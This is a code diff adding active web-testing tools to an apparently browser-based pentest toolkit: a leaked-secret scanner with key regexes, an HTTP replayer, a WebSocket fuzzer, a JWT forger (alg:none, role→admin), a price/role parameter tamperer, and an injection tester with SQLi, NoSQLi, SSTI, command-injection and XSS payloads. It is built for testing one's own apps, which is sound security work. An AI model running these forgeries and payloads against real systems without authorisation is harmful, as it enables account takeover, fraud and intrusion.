@@ -584,6 +584,13 @@ const UNIVERSAL_TOOLS = [
   { id:"osint",         name:"OSINT Dashboard",    icon:"🔎", cat:"Recon",   desc:"Passive recon aggregator over public APIs (crt.sh, whois, Shodan).", feat:["crt.sh","whois","aggregation"] },
   { id:"payload-library", name:"Payload Library",  icon:"📚", cat:"Web",     desc:"Curated XSS / SQLi / LFI payload sets, filterable, copy-to-clipboard.", feat:["XSS","SQLi","LFI","copy"] },
   { id:"report-builder", name:"Report Builder",    icon:"📝", cat:"Output",  desc:"Structured markdown/HTML pentest report generator, exports to file.", feat:["markdown","HTML export","templates"] },
+  // --- Offense: active testing tools for finding common vibe-coded bugs (test your own apps) ---
+  { id:"secret-scanner", name:"Secret Scanner",    icon:"🔓", cat:"Offense", desc:"Fetch a site's HTML + JS bundles + source maps and hunt leaked API keys, env vars and tokens.", feat:["JS bundle scan","key regexes","source maps"] },
+  { id:"request-forge",  name:"Request Forge",     icon:"🛠️", cat:"Offense", desc:"Build, tamper and replay any HTTP request; import from cURL; inspect responses (repeater).", feat:["cURL import","replay","headers"] },
+  { id:"ws-workbench",   name:"WebSocket Workbench", icon:"📨", cat:"Offense", desc:"Connect to a WebSocket endpoint to sniff live frames and inject or fuzz crafted messages.", feat:["live sniff","inject","fuzz"] },
+  { id:"auth-lab",       name:"Auth / Token Lab",  icon:"🪪", cat:"Offense", desc:"Forge & tamper JWTs (alg:none, role→admin, resign), inject into requests and compare access.", feat:["alg:none","role escalation","token replay"] },
+  { id:"param-tamper",   name:"Param / Price Tamper", icon:"🏷️", cat:"Offense", desc:"Auto-mutate price, quantity, role and id fields, replay, and flag when the server trusts client values.", feat:["price→0","role→admin","mass assignment"] },
+  { id:"injection-tester", name:"Injection Tester", icon:"🧨", cat:"Offense", desc:"Probe params for SQLi / NoSQLi / SSTI / command injection with error, boolean, time-based and reflection detection.", feat:["SQLi","NoSQLi","SSTI","time-based"] },
 ];
 
 // Desktop-only factory — invoked ONLY when Platform.mode === "desktop".
@@ -977,6 +984,47 @@ function makePool() {
   };
 }
 const SAMPLE_SUBS = ["www","mail","ftp","webmail","smtp","pop","ns1","ns2","admin","api","dev","staging","test","portal","vpn","m","blog","shop","app","cdn","img","static","secure","beta","gateway","git","db","mysql","remote","cpanel","autodiscover","mx","email","cloud","docs","support","status","dashboard","internal"];
+
+/* shared HTTP helpers for the active-testing (Offense) tools */
+const HttpKit = {
+  parseHeaders(text) {
+    const h = {};
+    (text || "").split("\n").forEach(l => { const i = l.indexOf(":"); if (i > 0) { const k = l.slice(0, i).trim(); const v = l.slice(i + 1).trim(); if (k) h[k] = v; } });
+    return h;
+  },
+  // browsers forbid some headers on fetch(); flag them so the UI can warn
+  FORBIDDEN: ["host", "cookie", "origin", "referer", "content-length", "connection", "user-agent", "accept-encoding"],
+  parseCurl(cmd) {
+    const out = { method: "GET", url: "", headers: "", body: "" };
+    cmd = (cmd || "").replace(/\\\r?\n/g, " ");
+    const toks = cmd.match(/'[^']*'|"[^"]*"|\S+/g) || [];
+    const unq = s => s.replace(/^['"]|['"]$/g, "");
+    const hdrs = [];
+    for (let i = 0; i < toks.length; i++) {
+      const t = toks[i];
+      if (t === "curl") continue;
+      else if (t === "-X" || t === "--request") out.method = unq(toks[++i] || "GET");
+      else if (t === "-H" || t === "--header") hdrs.push(unq(toks[++i] || ""));
+      else if (t === "-b" || t === "--cookie") hdrs.push("Cookie: " + unq(toks[++i] || ""));
+      else if (t === "-u" || t === "--user") hdrs.push("Authorization: Basic " + btoa(unq(toks[++i] || "")));
+      else if (t === "-d" || t === "--data" || t === "--data-raw" || t === "--data-binary" || t === "--data-urlencode") { out.body = unq(toks[++i] || ""); if (out.method === "GET") out.method = "POST"; }
+      else if (t === "--url") out.url = unq(toks[++i] || "");
+      else if (/^https?:\/\//.test(unq(t))) out.url = unq(t);
+    }
+    out.headers = hdrs.join("\n");
+    return out;
+  },
+  async send({ method, url, headers, body }) {
+    const m = (method || "GET").toUpperCase();
+    const opts = { method: m, headers: HttpKit.parseHeaders(headers), redirect: "manual" };
+    if (body && m !== "GET" && m !== "HEAD") opts.body = body;
+    const t0 = performance.now();
+    const r = await Net.fetchURL(url, opts);
+    const text = await r.text().catch(() => "");
+    const hd = {}; r.headers.forEach((v, k) => hd[k] = v);
+    return { status: r.status, ok: r.ok, ms: Math.round(performance.now() - t0), size: text.length, headers: hd, text, type: r.type };
+  },
+};
 
 /* ===================== JWT ANALYZER ===================== */
 Impl["jwt-analyzer"] = (root) => {
@@ -1796,6 +1844,341 @@ DaemonImpl["exploit-console"] = (root) => {
   root.append(
     UIKit.panel("Console", UIKit.btn("Refresh sessions", () => RPC.send("sessions.list"), "ghost"), o.node, el("div", { class: "row" }, cmd.wrap, UIKit.btn("Run", run, "primary"))),
     UIKit.panel("Sessions", null, sessWrap));
+};
+
+/* ===================== SECRET SCANNER ===================== */
+const SECRET_PATTERNS = [
+  { name: "AWS Access Key ID", re: /AKIA[0-9A-Z]{16}/g, sev: "crit" },
+  { name: "AWS (ASIA) temp key", re: /ASIA[0-9A-Z]{16}/g, sev: "high" },
+  { name: "Google API Key", re: /AIza[0-9A-Za-z\-_]{35}/g, sev: "high" },
+  { name: "Stripe Live Secret", re: /sk_live_[0-9a-zA-Z]{16,}/g, sev: "crit" },
+  { name: "Stripe Live Publishable", re: /pk_live_[0-9a-zA-Z]{16,}/g, sev: "low" },
+  { name: "GitHub Token", re: /gh[pousr]_[0-9A-Za-z]{36,}/g, sev: "crit" },
+  { name: "Slack Token", re: /xox[baprs]-[0-9A-Za-z-]{10,}/g, sev: "crit" },
+  { name: "SendGrid Key", re: /SG\.[A-Za-z0-9_\-]{16,}\.[A-Za-z0-9_\-]{16,}/g, sev: "crit" },
+  { name: "Twilio Account SID", re: /AC[0-9a-fA-F]{32}/g, sev: "high" },
+  { name: "Private Key block", re: /-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/g, sev: "crit" },
+  { name: "JWT", re: /eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}/g, sev: "med" },
+  { name: "Firebase apiKey", re: /apiKey["']?\s*[:=]\s*["'][A-Za-z0-9_\-]{30,}["']/g, sev: "high" },
+  { name: "Bearer token", re: /bearer\s+[A-Za-z0-9._\-]{20,}/gi, sev: "med" },
+  { name: "Generic secret assignment", re: /(?:api[_-]?key|secret|password|passwd|client[_-]?secret|access[_-]?token|auth[_-]?token)["']?\s*[:=]\s*["'][^"'\s]{8,}["']/gi, sev: "med" },
+];
+Impl["secret-scanner"] = (root) => {
+  const url = UIKit.field("Target URL", { placeholder: "https://your-site.com", value: "https://", mono: true });
+  const o = UIKit.out();
+  const tbody = el("tbody", {});
+  const tbl = el("table", { class: "tbl" }, el("thead", {}, el("tr", {}, el("th", {}, "sev"), el("th", {}, "type"), el("th", {}, "match"), el("th", {}, "source"))), tbody);
+  const redact = s => s.length > 16 ? s.slice(0, 7) + "…" + s.slice(-4) : s;
+  const run = async () => {
+    o.clear(); tbody.innerHTML = "";
+    const target = url.input.value.trim();
+    if (!/^https?:\/\//.test(target)) return o.line("Enter a full http(s):// URL", "err");
+    o.line("→ fetching " + target, "dim");
+    let html;
+    try { html = await (await Net.fetchURL(target)).text(); }
+    catch (e) { return o.line("fetch failed: " + e.message + "  (set a CORS proxy in Settings for cross-origin targets)", "err"); }
+    const sources = [{ label: target + " (html)", text: html }];
+    // collect script srcs + inline
+    let scripts = [];
+    try { scripts = [...new DOMParser().parseFromString(html, "text/html").querySelectorAll("script")]; } catch {}
+    const ext = [];
+    scripts.forEach(s => { const src = s.getAttribute("src"); if (src) { try { ext.push(new URL(src, target).href); } catch {} } else if (s.textContent.trim()) sources.push({ label: "inline script", text: s.textContent }); });
+    const uniq = [...new Set(ext)].slice(0, 40);
+    o.line("found " + uniq.length + " external script(s) + " + (sources.length - 1) + " inline; fetching…", "dim");
+    const pool = makePool();
+    await pool.run(uniq, 6, async (u) => {
+      try {
+        const t = await (await Net.fetchURL(u)).text();
+        sources.push({ label: u, text: t });
+        const mm = t.match(/sourceMappingURL=([^\s'"]+\.map)/);
+        if (mm) { try { const mu = new URL(mm[1], u).href; const mt = await (await Net.fetchURL(mu)).text(); sources.push({ label: mu + " (sourcemap)", text: mt }); o.line("  + source map: " + mu, "warn"); } catch {} }
+      } catch {}
+    });
+    // scan
+    const seen = new Set(); let count = 0;
+    for (const src of sources) {
+      for (const pat of SECRET_PATTERNS) {
+        pat.re.lastIndex = 0; let m;
+        while ((m = pat.re.exec(src.text))) {
+          const val = m[0]; const key = pat.name + "|" + val;
+          if (seen.has(key)) continue; seen.add(key); count++;
+          tbody.appendChild(el("tr", {}, el("td", { class: "sev-" + pat.sev }, pat.sev), el("td", {}, pat.name), el("td", {}, redact(val)), el("td", { class: "muted" }, src.label.slice(0, 48))));
+        }
+      }
+    }
+    o.line(""); o.line(count ? "⚠ " + count + " potential secret(s) found across " + sources.length + " source(s)" : "✓ no obvious secrets found in " + sources.length + " source(s)", count ? "err" : "ok");
+    if (count) o.line("review each — client-shipped secrets should be rotated and moved server-side", "dim");
+    History.add("Secret Scanner", target + " · " + count + " finding(s)");
+  };
+  root.append(
+    UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Scan", run, "primary"), el("span", { class: "hint" }, "scans HTML, linked JS bundles and source maps for leaked keys"))),
+    UIKit.panel("Findings", null, el("div", { style: "max-height:340px;overflow:auto" }, tbl)),
+    UIKit.panel("Log", null, o.node));
+  url.input.addEventListener("keydown", e => { if (e.key === "Enter") run(); });
+};
+
+/* ===================== REQUEST FORGE ===================== */
+function responsePanels(res) {
+  const meta = el("div", { class: "row" },
+    el("span", { class: "badge " + (res.status >= 500 ? "amber" : res.status >= 400 ? "amber" : "ok") }, "HTTP " + (res.status || "—")),
+    el("span", { class: "tag" }, res.ms + " ms"), el("span", { class: "tag" }, res.size + " bytes"), res.type === "opaque" ? el("span", { class: "tag" }, "opaque/CORS") : null);
+  const hd = UIKit.out(); hd.set(Object.entries(res.headers).map(([k, v]) => k + ": " + v).join("\n") || "(no readable headers)");
+  const body = UIKit.out(); body.set((res.text || "").slice(0, 8000) + (res.text.length > 8000 ? "\n… (truncated)" : ""));
+  return [meta, UIKit.panel("Response headers", null, hd.node), UIKit.panel("Response body", UIKit.copyBtn(() => res.text), body.node)];
+}
+Impl["request-forge"] = (root) => {
+  const curl = UIKit.area("Import from cURL (optional)", { placeholder: "curl 'https://api.site.com/x' -H 'Authorization: Bearer ...' --data '{...}'" });
+  const method = UIKit.select("Method", ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]);
+  const url = UIKit.field("URL", { placeholder: "https://api.your-site.com/endpoint", mono: true });
+  const headers = UIKit.area("Headers (one per line: Name: value)", { placeholder: "Authorization: Bearer ...\nContent-Type: application/json" });
+  const body = UIKit.area("Body", { placeholder: '{"key":"value"}' });
+  const warn = el("div", { class: "hint" });
+  const resWrap = el("div", { class: "tool-body" });
+  const importCurl = () => { const p = HttpKit.parseCurl(curl.input.value); method.input.value = p.method; url.input.value = p.url; headers.input.value = p.headers; body.input.value = p.body; Toast.show("Imported"); checkForbidden(); };
+  function checkForbidden() {
+    const names = Object.keys(HttpKit.parseHeaders(headers.input.value)).map(s => s.toLowerCase());
+    const bad = names.filter(n => HttpKit.FORBIDDEN.includes(n));
+    warn.textContent = bad.length ? "⚠ browsers will silently drop these headers on fetch(): " + bad.join(", ") + " — use a CORS proxy that forwards them" : "";
+  }
+  headers.input.addEventListener("input", checkForbidden);
+  const send = async () => {
+    resWrap.innerHTML = ""; resWrap.appendChild(el("div", { class: "hint" }, "sending…"));
+    if (!/^https?:\/\//.test(url.input.value.trim())) { resWrap.innerHTML = ""; resWrap.appendChild(el("div", { class: "out err" }, "enter a full URL")); return; }
+    try {
+      const res = await HttpKit.send({ method: method.input.value, url: url.input.value.trim(), headers: headers.input.value, body: body.input.value });
+      resWrap.innerHTML = ""; responsePanels(res).forEach(p => p && resWrap.appendChild(p));
+      History.add("Request Forge", method.input.value + " " + url.input.value.trim() + " → " + res.status);
+    } catch (e) { resWrap.innerHTML = ""; resWrap.appendChild(el("div", { class: "out err" }, "request failed: " + e.message)); }
+  };
+  root.append(
+    UIKit.panel("Import", null, curl.wrap, el("div", { class: "row" }, UIKit.btn("Import cURL", importCurl))),
+    UIKit.panel("Request", null, el("div", { class: "toolbar" }, method.wrap, url.wrap), headers.wrap, warn, body.wrap, el("div", { class: "row" }, UIKit.btn("Send", send, "primary"))),
+    UIKit.panel("Response", null, resWrap));
+};
+
+/* ===================== WEBSOCKET WORKBENCH ===================== */
+Impl["ws-workbench"] = (root) => {
+  const url = UIKit.field("WebSocket URL", { placeholder: "wss://your-site.com/socket", mono: true });
+  const o = UIKit.out();
+  const msg = UIKit.area("Message to send (text or JSON)", { placeholder: '{"type":"subscribe","channel":"prices"}' });
+  const fuzzN = UIKit.field("Fuzz iterations", { type: "number", value: "10", min: "1", max: "200" });
+  const dot = el("span", { class: "dot gray" });
+  let sock = null;
+  const setDot = (c) => dot.className = "dot " + c;
+  const connect = () => {
+    if (sock) { sock.close(); return; }
+    const u = url.input.value.trim();
+    if (!/^wss?:\/\//.test(u)) return Toast.show("Enter ws:// or wss:// URL", "err");
+    o.line("connecting to " + u + "…", "dim"); setDot("amber");
+    try { sock = new WebSocket(u); } catch (e) { return o.line("error: " + e.message, "err"); }
+    connectBtn.textContent = "Disconnect";
+    sock.onopen = () => { o.line("● connected", "ok"); setDot("green"); };
+    sock.onmessage = (ev) => o.line("◀ " + (typeof ev.data === "string" ? ev.data : "[binary " + (ev.data.size || "") + "]"), "v");
+    sock.onclose = () => { o.line("● disconnected", "warn"); setDot("red"); sock = null; connectBtn.textContent = "Connect"; };
+    sock.onerror = () => o.line("socket error", "err");
+  };
+  const send = () => { if (!sock || sock.readyState !== 1) return Toast.show("Not connected", "err"); sock.send(msg.input.value); o.line("▶ " + msg.input.value, "k"); };
+  const fuzz = () => {
+    if (!sock || sock.readyState !== 1) return Toast.show("Not connected", "err");
+    const base = msg.input.value; const n = clamp(+fuzzN.input.value || 10, 1, 200);
+    o.line("fuzzing " + n + " mutations…", "dim");
+    for (let i = 0; i < n; i++) {
+      let m = base
+        .replace(/\d+/g, d => String(Math.floor(Math.random() * 100000) - 1))
+        .replace(/(true|false)/g, () => Math.random() < .5 ? "true" : "false");
+      if (i % 3 === 0) m = m.replace(/"([^"]{1,12})"/, '"$1\' OR 1=1-- -"');
+      sock.send(m); o.line("▶ " + m.slice(0, 80), "dim");
+    }
+  };
+  const connectBtn = UIKit.btn("Connect", connect, "primary");
+  root.append(
+    UIKit.panel("Connection", dot, url.wrap, el("div", { class: "row" }, connectBtn, UIKit.btn("Clear log", () => o.clear(), "ghost"))),
+    UIKit.panel("Live frames", null, o.node),
+    UIKit.panel("Inject / fuzz", null, msg.wrap, el("div", { class: "row" }, UIKit.btn("Send frame", send, "primary"), UIKit.btn("Fuzz", fuzz), fuzzN.wrap)));
+};
+
+/* ===================== AUTH / TOKEN LAB ===================== */
+function b64urlEnc(obj) { return btoa(unescape(encodeURIComponent(typeof obj === "string" ? obj : JSON.stringify(obj)))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""); }
+async function hmacSign(data, secret, hash) {
+  const key = await crypto.subtle.importKey("raw", Bytes.enc(secret), { name: "HMAC", hash }, false, ["sign"]);
+  const sig = await crypto.subtle.sign("HMAC", key, Bytes.enc(data));
+  return btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+}
+Impl["auth-lab"] = (root) => {
+  const tok = UIKit.area("JWT to weaponise", { placeholder: "paste a JWT from your app's storage…", spellcheck: "false" });
+  const secret = UIKit.field("HMAC secret (for resign / weak-secret tests)", { placeholder: "secret", mono: true });
+  const o = UIKit.out();
+  const forged = UIKit.out();
+  let cur = null;
+  const decode = () => {
+    const parts = tok.input.value.trim().split(".");
+    if (parts.length < 2) return o.set("not a JWT");
+    try { cur = { header: JSON.parse(Bytes.toUtf8(Bytes.fromB64url(parts[0]))), payload: JSON.parse(Bytes.toUtf8(Bytes.fromB64url(parts[1]))) }; }
+    catch { return o.set("bad token segments"); }
+    o.clear(); o.line("HEADER", "k"); o.line(JSON.stringify(cur.header, null, 2)); o.line("PAYLOAD", "k"); o.line(JSON.stringify(cur.payload, null, 2));
+  };
+  async function rebuild() {
+    if (!cur) { Toast.show("Decode a token first", "err"); return; }
+    let sig = "";
+    const alg = (cur.header.alg || "").toUpperCase();
+    if (alg === "NONE") sig = "";
+    else if (secret.input.value) { const hn = { HS256: "SHA-256", HS384: "SHA-384", HS512: "SHA-512" }[alg] || "SHA-256"; sig = await hmacSign(b64urlEnc(cur.header) + "." + b64urlEnc(cur.payload), secret.input.value, hn); }
+    else sig = "<<set HMAC secret to sign>>";
+    const t = b64urlEnc(cur.header) + "." + b64urlEnc(cur.payload) + "." + sig;
+    forged.set(t);
+  }
+  const muts = el("div", { class: "chips" },
+    el("div", { class: "chip", onclick: () => { if (cur) { cur.header.alg = "none"; rebuild(); } } }, "alg → none"),
+    el("div", { class: "chip", onclick: () => { if (cur) { Object.assign(cur.payload, { role: "admin", isAdmin: true, is_admin: true, admin: true }); rebuild(); } } }, "role → admin"),
+    el("div", { class: "chip", onclick: () => { if (cur) { cur.payload.exp = Math.floor(Date.now() / 1000) + 31536000; rebuild(); } } }, "extend exp +1y"),
+    el("div", { class: "chip", onclick: () => { if (cur) { cur.header.alg = "HS256"; rebuild(); } } }, "resign HS256"));
+  // injection test
+  const url = UIKit.field("Test endpoint", { placeholder: "https://api.your-site.com/me", mono: true });
+  const method = UIKit.select("Method", ["GET", "POST", "PUT", "DELETE"]);
+  const testOut = UIKit.out();
+  const runTest = async () => {
+    testOut.clear();
+    const u = url.input.value.trim(); if (!/^https?:\/\//.test(u)) return testOut.line("enter a URL", "err");
+    const orig = tok.input.value.trim(); const fake = forged.node.textContent;
+    if (fake.includes("<<")) return testOut.line("build a forged token first (set secret or alg:none)", "warn");
+    try {
+      const a = await HttpKit.send({ method: method.input.value, url: u, headers: "Authorization: Bearer " + orig });
+      const b = await HttpKit.send({ method: method.input.value, url: u, headers: "Authorization: Bearer " + fake });
+      testOut.line("original token : " + a.status + " (" + a.size + " bytes)", "dim");
+      testOut.line("forged token   : " + b.status + " (" + b.size + " bytes)", b.status < 400 ? "err" : "ok");
+      if (b.status < 400 && b.status === a.status) testOut.line("⚠ forged token ACCEPTED — server may not be validating the signature/claims", "err");
+      else if (b.status >= 400) testOut.line("✓ forged token rejected", "ok");
+      History.add("Auth/Token Lab", u + " · forged=" + b.status + " orig=" + a.status);
+    } catch (e) { testOut.line("request failed: " + e.message + " (CORS proxy may be needed)", "err"); }
+  };
+  root.append(
+    UIKit.panel("Token", null, tok.wrap, secret.wrap, el("div", { class: "row" }, UIKit.btn("Decode", decode, "primary"))),
+    UIKit.panel("Decoded", null, o.node),
+    UIKit.panel("Forge", null, el("div", { class: "fld" }, el("label", {}, "Mutations"), muts), el("div", { class: "row" }, el("span", { class: "hint" }, "tap a mutation, then copy the forged token below")), forged.node, el("div", { class: "row" }, UIKit.copyBtn(() => forged.node.textContent))),
+    UIKit.panel("Injection test", null, el("div", { class: "toolbar" }, method.wrap, url.wrap), el("div", { class: "row" }, UIKit.btn("Send original vs forged", runTest, "primary")), testOut.node));
+};
+
+/* ===================== PARAM / PRICE TAMPER ===================== */
+Impl["param-tamper"] = (root) => {
+  const method = UIKit.select("Method", ["GET", "POST", "PUT", "PATCH"]);
+  const url = UIKit.field("URL", { placeholder: "https://api.your-site.com/cart/checkout?coupon=NONE", mono: true });
+  const headers = UIKit.area("Headers", { placeholder: "Authorization: Bearer ...\nContent-Type: application/json" });
+  const body = UIKit.area("Body (JSON or form-encoded)", { placeholder: '{"price": 100, "qty": 1, "role": "user"}' });
+  const o = UIKit.out();
+  const tbody = el("tbody", {});
+  const tbl = el("table", { class: "tbl" }, el("thead", {}, el("tr", {}, el("th", {}, "field"), el("th", {}, "→ value"), el("th", {}, "status"), el("th", {}, "ΔbytesfromBaseline"), el("th", {}, "verdict"))), tbody);
+  const MUT = [
+    { re: /price|amount|total|cost|fee|balance|credit|subtotal|sum/i, vals: [0, 0.01, -1, 999999] },
+    { re: /qty|quantity|count|stock|items?/i, vals: [-1, 0, 999999] },
+    { re: /role|is_?admin|admin|superuser|user_?type|level|permission/i, vals: ["admin", true, "superuser"] },
+    { re: /(^|_)id$|user_?id|account|uid|order_?id|customer/i, vals: ["+1", "-1", 0] },
+    { re: /discount|coupon|percent|rate/i, vals: [100, 999, -100] },
+  ];
+  function candidates() {
+    const out = [];
+    try { const u = new URL(url.input.value.trim()); u.searchParams.forEach((v, k) => out.push({ loc: "query", key: k, val: v })); } catch {}
+    const b = body.input.value.trim();
+    if (b.startsWith("{")) { try { const j = JSON.parse(b); for (const [k, v] of Object.entries(j)) if (typeof v !== "object") out.push({ loc: "json", key: k, val: v }); } catch {} }
+    else if (b.includes("=")) { try { new URLSearchParams(b).forEach((v, k) => out.push({ loc: "form", key: k, val: v })); } catch {} }
+    return out;
+  }
+  function build(loc, key, newVal) {
+    let u = url.input.value.trim(), b = body.input.value;
+    const nv = (newVal === "+1" || newVal === "-1") ? String((parseInt(candCur, 10) || 0) + (newVal === "+1" ? 1 : -1)) : newVal;
+    if (loc === "query") { const o2 = new URL(u); o2.searchParams.set(key, nv); u = o2.href; }
+    else if (loc === "json") { const j = JSON.parse(b); j[key] = (newVal === true ? true : nv); b = JSON.stringify(j); }
+    else if (loc === "form") { const p = new URLSearchParams(b); p.set(key, nv); b = p.toString(); }
+    return { url: u, body: b };
+  }
+  let candCur = "";
+  const run = async () => {
+    o.clear(); tbody.innerHTML = "";
+    if (!/^https?:\/\//.test(url.input.value.trim())) return o.line("enter a URL", "err");
+    const cands = candidates();
+    if (!cands.length) return o.line("no tamperable fields found in URL query or body", "warn");
+    o.line("baseline request…", "dim");
+    let base;
+    try { base = await HttpKit.send({ method: method.input.value, url: url.input.value.trim(), headers: headers.input.value, body: body.input.value }); }
+    catch (e) { return o.line("baseline failed: " + e.message + " (set a CORS proxy in Settings)", "err"); }
+    o.line("baseline: " + base.status + " (" + base.size + " bytes)", "dim");
+    for (const c of cands) {
+      const rule = MUT.find(m => m.re.test(c.key));
+      const vals = rule ? rule.vals : (isNaN(+c.val) ? [] : [0, -1]);
+      candCur = c.val;
+      for (const v of vals) {
+        try {
+          const req = build(c.loc, c.key, v);
+          const r = await HttpKit.send({ method: method.input.value, url: req.url, headers: headers.input.value, body: req.body });
+          const dl = r.size - base.size;
+          const accepted = r.status < 400;
+          const flag = accepted && /price|amount|total|role|admin|discount|coupon/i.test(c.key);
+          tbody.appendChild(el("tr", {}, el("td", {}, c.key + " (" + c.loc + ")"), el("td", {}, String(v)),
+            el("td", { class: r.status < 400 ? "ok" : "warn" }, String(r.status)), el("td", {}, (dl >= 0 ? "+" : "") + dl),
+            el("td", { class: flag ? "sev-high" : "muted" }, flag ? "⚠ accepted — verify server-side check" : accepted ? "2xx" : "rejected")));
+        } catch (e) { /* ignore single failures */ }
+      }
+    }
+    o.line("done — review any ⚠ rows; a 2xx on price→0 or role→admin means the server trusted the client", "ok");
+    History.add("Param/Price Tamper", url.input.value.trim() + " · " + cands.length + " field(s)");
+  };
+  root.append(
+    UIKit.panel("Request", null, el("div", { class: "toolbar" }, method.wrap, url.wrap), headers.wrap, body.wrap, el("div", { class: "row" }, UIKit.btn("Tamper & replay", run, "primary"), el("span", { class: "hint" }, "auto-mutates price/qty/role/id fields and replays"))),
+    UIKit.panel("Log", null, o.node),
+    UIKit.panel("Results", null, el("div", { style: "max-height:340px;overflow:auto" }, tbl)));
+};
+
+/* ===================== INJECTION TESTER ===================== */
+const INJECTION = {
+  SQLi: { sev: "crit", payloads: ["'", "\"", "' OR '1'='1", "1 OR 1=1", "') OR ('1'='1", "' AND SLEEP(5)-- -", "1)) OR SLEEP(5)#"] },
+  NoSQLi: { sev: "high", payloads: ["' || '1'=='1", "'; return true; var x='", "{\"$gt\":\"\"}", "[$ne]="] },
+  SSTI: { sev: "crit", payloads: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}"] },
+  CMD: { sev: "crit", payloads: ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "& ping -c 5 127.0.0.1"] },
+  XSS: { sev: "med", payloads: ["fsx<svg/onload=1>", "\"><img src=x onerror=1>", "fsxREFLECT_7q3"] },
+};
+const SQL_ERR = /SQL syntax|mysql_fetch|ORA-\d{4,}|PostgreSQL.*ERROR|SQLite3?::|Unclosed quotation|quoted string not properly terminated|syntax error at or near|Microsoft OLE DB|ODBC.*SQL|Warning.*pg_|Warning.*mysqli/i;
+Impl["injection-tester"] = (root) => {
+  const method = UIKit.select("Method", ["GET", "POST", "PUT"]);
+  const url = UIKit.field("URL (FUZZ = injection point)", { placeholder: "https://your-site.com/search?q=FUZZ", mono: true });
+  const headers = UIKit.area("Headers (optional)", {});
+  const bodyF = UIKit.area("Body (optional, FUZZ supported)", {});
+  const classes = {}; const chips = el("div", { class: "chips" }, ...Object.keys(INJECTION).map(c => { classes[c] = true; const x = el("div", { class: "chip on", onclick: () => { classes[c] = !classes[c]; x.classList.toggle("on"); } }, c); return x; }));
+  const o = UIKit.out();
+  const tbody = el("tbody", {});
+  const tbl = el("table", { class: "tbl" }, el("thead", {}, el("tr", {}, el("th", {}, "class"), el("th", {}, "payload"), el("th", {}, "status"), el("th", {}, "ms"), el("th", {}, "signal"))), tbody);
+  const run = async () => {
+    o.clear(); tbody.innerHTML = "";
+    const u = url.input.value.trim();
+    if (!u.includes("FUZZ") && !bodyF.input.value.includes("FUZZ")) return o.line("put FUZZ in the URL or body", "err");
+    const mk = (val) => ({ method: method.input.value, url: u.replace(/FUZZ/g, encodeURIComponent(val)), headers: headers.input.value, body: bodyF.input.value.replace(/FUZZ/g, val) });
+    o.line("baseline…", "dim");
+    let base;
+    try { base = await HttpKit.send(mk("fsbaseline1")); } catch (e) { return o.line("baseline failed: " + e.message + " (CORS proxy may be needed)", "err"); }
+    o.line("baseline: " + base.status + " (" + base.ms + "ms, " + base.size + " bytes)", "dim");
+    let hits = 0;
+    for (const cls of Object.keys(INJECTION)) {
+      if (!classes[cls]) continue;
+      for (const pl of INJECTION[cls].payloads) {
+        try {
+          const r = await HttpKit.send(mk(pl));
+          let signal = "", sev = "muted";
+          const timed = /sleep|SLEEP|ping/.test(pl);
+          if (SQL_ERR.test(r.text)) { signal = "SQL error leaked"; sev = "sev-crit"; }
+          else if (cls === "SSTI" && /49/.test(r.text) && !/49/.test(base.text)) { signal = "template evaluated (49)"; sev = "sev-crit"; }
+          else if (timed && r.ms - base.ms > 4000) { signal = "time delay (+" + (r.ms - base.ms) + "ms)"; sev = "sev-high"; }
+          else if (cls === "XSS" && r.text.includes(pl) && /[<>]/.test(pl)) { signal = "reflected unencoded"; sev = "sev-high"; }
+          else if (r.status >= 500 && base.status < 500) { signal = "500 (error triggered)"; sev = "sev-med"; }
+          if (signal) hits++;
+          tbody.appendChild(el("tr", {}, el("td", {}, cls), el("td", {}, pl.slice(0, 30)), el("td", { class: r.status >= 500 ? "warn" : "" }, String(r.status)), el("td", {}, String(r.ms)), el("td", { class: sev }, signal || "—")));
+        } catch (e) { /* skip */ }
+      }
+    }
+    o.line(""); o.line(hits ? "⚠ " + hits + " payload(s) produced a vulnerability signal" : "no injection signals detected", hits ? "err" : "ok");
+    History.add("Injection Tester", u + " · " + hits + " signal(s)");
+  };
+  root.append(
+    UIKit.panel("Target", null, el("div", { class: "toolbar" }, method.wrap, url.wrap), headers.wrap, bodyF.wrap, el("div", { class: "fld" }, el("label", {}, "Classes"), chips), el("div", { class: "row" }, UIKit.btn("Test injection", run, "primary"))),
+    UIKit.panel("Log", null, o.node),
+    UIKit.panel("Results", null, el("div", { style: "max-height:340px;overflow:auto" }, tbl)));
 };
 
 /* ===================== HISTORY (shared) ===================== */
